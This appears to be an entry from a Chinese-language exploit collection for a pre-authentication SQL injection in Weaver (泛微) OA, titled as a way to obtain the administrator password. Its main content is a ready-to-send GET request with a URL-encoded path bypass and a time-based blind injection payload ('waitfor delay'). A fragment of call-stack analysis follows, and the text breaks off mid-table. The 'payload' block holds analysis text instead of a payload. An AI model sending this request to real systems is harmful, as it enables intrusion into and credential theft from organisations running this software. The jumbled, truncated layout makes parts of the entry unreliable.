# 泛微OA前台sql注入获取管理员密码

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`GET /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30?modeid=1452+waitfor+delay+'0%3a0%3a5' HTTP/1.1`

**请求体 / payload**
```
## 漏洞分析
/weaver/weaver.formmode.servelt.QRcodeBuildAction
登录后访问/weaver/weaver.formmode.servelt.QRcodeBuildAction#service接口会经过如下Filter
service:43, QRcodeBuildAction (weaver.formmode.servelt)
doFilter:51, DateFormatFilter (weaver.dateformat)
doFilterInternal:29, FileNamingChe
```

**其他**
- 漏洞分析: /weaver/weaver.formmode.servelt.QRcodeBuildAction
| <br/>登录后访问/weaver/weaver.formmode.servelt.QRcodeBuildAction#service接口会经过如下Filter<br/>service:43, QRcodeBuildAction (weaver.formmode.servelt)<br/>doFilter:51, DateFormatFilter (weaver.dateformat)<br/>doFilterInternal:29, FileNamingCheckFilter (weaver.file)<br/>doFilter:76, OncePerRequestFilter (org.springframework.web.filter)<br/>doFilter:89, Addr